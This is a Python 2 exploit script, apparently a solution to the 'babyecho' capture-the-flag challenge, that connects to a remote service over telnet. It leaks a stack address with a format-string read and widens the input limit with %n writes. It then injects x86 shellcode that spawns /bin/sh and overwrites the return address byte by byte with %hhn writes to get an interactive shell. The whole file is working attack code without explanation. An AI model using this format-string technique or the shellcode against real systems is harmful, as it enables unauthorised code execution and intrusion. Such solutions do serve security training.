import telnetlib
import commands
import struct

SC = "\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"

host = 'babyecho_eb11fdf6e40236b1a37b7974c53b6c3d.quals.shallweplayaga.me'
port = 3232

#host = "localhost"
#port = 1234

tn = telnetlib.Telnet(host,port)
#raw_input("use gdb!")

print tn.read_until("bytes")
tn.write("%5$x" + "\n")
data = tn.read_until("bytes")
st = int(data.split("\n")[1],16)
print "[+]Got stack address - 0x%x" % st
l = st - 0xc
addr = struct.pack("<I",l)
tn.write(addr + "%9c%7$n" + "\n")
print tn.read_until("bytes")
tn.write(addr + "%99c%7$n" + "\n")
print tn.read_until("bytes")
tn.write(addr + "%999c%7$n" + "\n")
print tn.read_until("bytes")

s = tn.get_socket()
print "[+] writing shellcode to 0x%x" % st
s.send("A" * 100 + SC + "\n")

print tn.read_until("bytes")
ret_addr = st - 0x20
b = st + 100 - 0x10
index = 7
buf = struct.pack('<I', ret_addr)
buf += struct.pack('<I', ret_addr+1)
buf += struct.pack('<I', ret_addr+2)
buf += struct.pack('<I', ret_addr+3)

a = map(ord, struct.pack('<I', b + 16))
a[3] = ((a[3]-a[2]-1) % 0x100) + 1
a[2] = ((a[2]-a[1]-1) % 0x100) + 1
a[1] = ((a[1]-a[0]-1) % 0x100) + 1
a[0] = ((a[0]-len(buf)-1) % 0x100) + 1

buf += "%%%dc%%%d$hhn" % (a[0], index)
buf += "%%%dc%%%d$hhn" % (a[1], index+1)
buf += "%%%dc%%%d$hhn" % (a[2], index+2)
buf += "%%%dc%%%d$hhn" % (a[3], index+3)

s.send(buf + "\n")
print
tn.interact()
